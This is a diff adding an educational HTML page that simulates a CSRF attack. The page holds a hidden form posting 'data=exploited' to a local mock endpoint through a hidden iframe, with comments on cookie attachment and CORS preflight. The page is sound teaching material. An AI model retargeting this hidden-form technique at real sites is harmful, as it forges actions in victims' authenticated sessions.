@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Concept Demonstration</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .card-shadow {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+        }
+        .card-shadow:hover {
+            box-shadow: 0 20px 25px -5px rgba(220, 38, 38, 0.2), 0 8px 10px -6px rgba(220, 38, 38, 0.1);
+        }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+
+    <div class="max-w-xl w-full bg-white rounded-xl p-8 card-shadow">
+        <h1 class="text-3xl font-bold text-red-600 mb-4">Cross-Site Request Forgery (CSRF) Demo</h1>
+        <p class="text-gray-700 mb-6 border-l-4 border-red-400 pl-3 py-1 bg-red-50">
+            **Purpose:** This page simulates a malicious website (`evil.com`) attempting to force a victim's browser to send a simple, state-changing request to a target domain (`bank.com` equivalent).
+            <br><br>
+            The request uses a **hidden HTML form** and **targets a conceptual, non-existent API endpoint** (`/transfer`). In a real attack, the browser automatically attaches the victim's session cookies for the target domain.
+        </p>
+
+        <div class="space-y-4">
+            <h2 class="text-xl font-semibold text-gray-800">1. Hidden Attack Vector (Form Method)</h2>
+            <p class="text-sm text-gray-600">This is the classic CSRF method, using a simple form POST which the browser is obligated to send cross-origin.</p>
+
+            <div class="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
+                <p class="font-mono text-xs mb-2">Target URL (Conceptual):</p>
+                <code class="block bg-yellow-100 p-2 rounded text-red-700 break-words">https://mock-target-api.local/transfer</code>
+                <p class="font-mono text-xs mt-3 mb-2">Payload Sent:</p>
+                <code class="block bg-yellow-100 p-2 rounded text-red-700 break-words">data=exploited</code>
+            </div>
+
+            <!--
+            The Attack: A hidden HTML form that automatically submits on page load.
+            The browser will send this POST request, including the session cookie for the action URL's domain.
+            -->
+            <form id="csrf-form" action="http://localhost:3537/action" method="POST" target="hidden-iframe" class="hidden">
+                <button type="submit">Submit Forgery</button>
+            </form>
+
+            <!-- A hidden iframe is used as the form's target to prevent page navigation -->
+            <iframe name="hidden-iframe" style="display:none;"></iframe>
+
+            <button id="trigger-btn" class="w-full bg-red-500 hover:bg-red-700 text-white font-bold py-3 px-4 rounded-lg focus:outline-none focus:shadow-outline">
+                Simulate Attack (Click to Trigger Hidden Form)
+            </button>
+        </div>
+
+        <div id="status-message" class="mt-6 p-3 bg-blue-100 text-blue-800 rounded-lg hidden">
+            Request sent to mock API endpoint. Check your browser's Network tab to see the cross-site POST request and the headers (which would include the cookie if one existed for 'mock-target-api.local').
+        </div>
+    </div>
+
+    <script>
+        const form = document.getElementById('csrf-form');
+        const triggerBtn = document.getElementById('trigger-btn');
+        const statusMessage = document.getElementById('status-message');
+
+        triggerBtn.addEventListener('click', () => {
+            // Programmatically submit the hidden form
+            form.submit();
+            statusMessage.classList.remove('hidden');
+            triggerBtn.textContent = 'Attack Initiated (Check Network Tab)';
+            triggerBtn.classList.remove('bg-red-500');
+            triggerBtn.classList.add('bg-green-600');
+        });
+
+        // Note: You cannot use JavaScript's fetch() or XMLHttpRequest (AJAX) here
+        // for a successful CSRF attack if the API is configured with strict
+        // CORS policies (e.g., requires application/json), because the browser
+        // would send a CORS pre-flight request which the malicious site cannot
+        // control or read. This is why the classic form POST is used for CSRF demo.
+
+    </script>
+</body>
+</html>
+
